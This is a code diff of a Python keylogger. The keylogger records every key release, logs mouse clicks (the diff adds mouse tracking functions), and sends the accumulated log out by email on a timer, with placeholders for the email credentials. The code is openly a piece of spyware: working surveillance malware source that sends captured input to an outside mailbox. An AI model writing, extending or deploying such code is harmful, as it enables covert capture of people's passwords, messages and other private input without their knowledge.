@@ -16,6 +16,7 @@ EMAIL_ADDRESS = "..."
 #need to generate app password for gmail, https://stackoverflow.com/questions/16512592/login-credentials-not-working-with-gmail-smtp 
 EMAIL_PASSWORD = "..."
 
+
 class Keylogger: 
     def __init__(self, report_frequency, report_style="email"): 
         self.report_frequency = report_frequency 
@@ -33,7 +34,7 @@ class Keylogger:
                 name = " " 
             elif name == "enter": 
                 name = "[ENTER]\n"
-            elif name == "decimal": 
+            elif name == "(decimal)": 
                 name = "." 
             else: 
                 name = name
@@ -71,20 +72,34 @@ class Keylogger:
         timer.daemon = True; 
         timer.start()
 
+    #mouse action functions 
+    def on_move(self, x, y):
+        self.log += 'Pointer moved to ({0}, {1}) \n'.format(x, y)
+
+    def on_click(self, x, y, button, pressed):
+        if pressed:
+            self.log += 'Mouse clicked at ({0}, {1}) with {2} \n'.format(x, y, button)
+
+    def on_scroll(self, x, y, dx, dy):
+        self.log += 'Scrolled {0} at {1} \n'.format('down' if dy < 0 else 'up', (x, y))
+    
+    
     def start(self): 
         keyboard.on_release(callback = self.key_log)
-        #after key is pressed, start timer on separate thread and 
+        listener = Listener(on_click=self.on_click)
+        listener.start()
+        #after key is pressed, start timer on separate thread 
         self.report_convention()
         #pauses programs, allows us to kill keylogger 
         keyboard.wait()
 
+    
 
 
 if __name__ == "__main__": 
     #email sending convention 
     keylogger = Keylogger(report_frequency=REPORT_FREQUENCY)
     keylogger.start()
-
 
 
 
